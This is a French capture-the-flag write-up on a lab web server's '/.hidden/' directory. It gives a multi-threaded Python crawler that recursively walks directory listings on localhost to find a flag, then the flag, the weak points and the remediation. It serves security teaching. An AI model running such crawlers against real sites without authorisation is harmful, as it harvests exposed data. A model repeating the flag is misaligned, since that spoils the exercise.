# Exploration de Répertoires Cachés (Brute-force `.hidden`)

## Description de la faille

Le serveur possède un répertoire racine nommé `/.hidden/`. Ce répertoire contient une arborescence massive de sous-répertoires (plusieurs milliers) organisés de manière récursive. Chaque dossier contient un fichier `README`. Cette technique, appelée **Security through obscurity** (la sécurité par l'obscurité), est une mauvaise pratique qui consiste à tenter de cacher une information sensible au lieu de la sécuriser.

## Méthode d'exploitation

L'exploration manuelle étant impossible au vu du nombre de fichiers (environ 18 000), j'ai automatisé la recherche à l'aide d'un script **Python** utilisant le multi-threading pour parcourir l'arborescence et analyser chaque fichier `README` à la recherche du flag.

### Script d'automatisation (Python)

Le script utilise `ThreadPoolExecutor` pour explorer les dossiers en parallèle et recherche une chaîne de 64 caractères hexadécimaux :

```python
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://localhost:8080"
START_URL = f"{BASE_URL}/.hidden/"
MAX_THREADS = 20
FLAG_PATTERN = re.compile(r'[0-9a-f]{64}')

visited = set()
flag_found = None
request_count = 0

def process_url(url):
    global flag_found, request_count
    if flag_found or url in visited: return []
    
    visited.add(url)
    req_start = time.perf_counter()
    try:
        r = requests.get(url, timeout=5)
        duration = time.perf_counter() - req_start
        request_count += 1
        print(f"[{request_count}] ({duration:.3f}s) Thread Check: {url}")

        match = FLAG_PATTERN.search(r.text)
        if match:
            flag_found = (match.group(0), url)
            return []

        if url.endswith('/'):
            links = re.findall(r'<a href="([^"]+)">', r.text)
            return [url + l for l in links if l not in ["../", "./"]]
    except:
        pass
    return []

def find_flag_threaded():
    global flag_found
    start_time = time.perf_counter()
    queue = [START_URL]
    
    print(f"[*] Démarrage MULTI-THREADÉ ({MAX_THREADS} threads)...")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while queue and not flag_found:
            futures = {executor.submit(process_url, url): url for url in queue}
            queue = []
            for future in as_completed(futures):
                if flag_found: break
                queue.extend(future.result())

    if flag_found:
        total_time = time.perf_counter() - start_time
        print(f"\n[!!!] FLAG TROUVÉ : {flag_found[0]}")
        print(f"[!] Temps total : {total_time:.2f} secondes pour {request_count} requêtes.")

if __name__ == "__main__":
    find_flag_threaded()

```

## Pourquoi cela fonctionne ?

Le fichier `robots.txt` à la racine du site, loin de protéger les données, a servi de vecteur d'information en révélant explicitement l'existence du répertoire `/.hidden/`.

Une fois cette porte d'entrée identifiée, deux failles majeures ont permis l'extraction du flag :

1. **L'Indexation de répertoire (Directory Listing) :** Le serveur est configuré pour lister le contenu des dossiers, permettant de naviguer dans l'arborescence sans connaître le nom des fichiers à l'avance.
2. **L'absence de contrôle d'accès :** Aucune authentification ou restriction d'IP n'était en place pour empêcher un outil automatisé de parcourir récursivement les milliers de fichiers `README` jusqu'à trouver l'information sensible.

---

## Flag

* **Localisation :** `/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README`
* **Flag :** `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

## Remédiation

* **Désactiver l'indexation :** Configurer le serveur (Apache/Nginx) pour interdire le "Directory Browsing" (Options `-Indexes`).
* **Suppression des données inutiles :** Ne jamais laisser de fichiers de test ou de documents sensibles dans des répertoires accessibles publiquement, même s'ils sont cachés ou nommés de manière aléatoire.
* **Contrôle d'accès :** Mettre en place des permissions strictes sur les fichiers du serveur.
